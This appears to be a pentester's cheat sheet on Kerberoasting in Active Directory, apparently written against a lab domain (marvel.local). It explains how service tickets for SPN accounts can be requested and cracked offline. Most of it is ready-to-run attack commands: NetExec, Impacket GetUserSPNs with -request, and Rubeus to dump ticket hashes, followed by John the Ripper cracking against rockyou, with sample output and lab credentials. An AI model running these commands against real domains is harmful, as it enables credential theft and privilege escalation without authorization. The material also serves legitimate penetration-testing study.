# Kerberoasting

Kerberoasting abuses the way Kerberos issues service tickets (TGS) to accounts with Service Principal Names (SPNs). These tickets are encrypted with the service account’s password hash, so an attacker who can request the ticket can then crack it offline

Kerberoasting targets accounts that have Service Principal Names (SPNs) registered in Active Directory (examples: HTTP/host.domain, MSSQLSvc/instance, LDAP, etc). Any domain user (not just admins) can request a service ticket for an SPN

Valid domain account is needed to obtain a TGS for an SPN (must be an authenticated domain user to request the ticket), but donot need special privileges beyond that

Not all service accounts are high-privileged. Many are low-privilege, but some service accounts are given elevated rights (or are members of privileged groups), which makes successful cracks high-value

## Kerberoasting with NetExec

```
# Get the hash
nxc ldap domain_name -u username -p 'password' --kerberoast outfile.txt

# then crack the hash using john-the-ripper or hashcat
```

## Kerberoasting with Impackets

```
# looking for available spn that user can request the service tickets
impacket-GetUserSPNs -dc-ip 'ip_address' 'marvel.local/alice.wonderland:P@ssw0rd!'
Impacket v0.13.0.dev0+20251002.113829.eaf2e556 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName             Name       MemberOf  PasswordLastSet             LastLogon  Delegation 
-------------------------------  ---------  --------  --------------------------  ---------  ----------
marvel.local/http_service:80     http_svc             2025-10-06 18:11:38.764634  <never>               
marvel.local/mssql_service:1433  mssql_svc            2025-10-06 18:11:38.447371  <never>  

# Now get the hash
impacket-GetUserSPNs -dc-ip 'ip_address' 'marvel.local/alice.wonderland:P@ssw0rd!' -request

# Copy the hash and crack the password
```

## Kerberoasting with Rubeus

```
# After getting the shell for the user alice.wonderland
.\Rubeus.exe kerberoast /nowrap /outfile:hash.txt

# now we got the hash then crack the hash
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```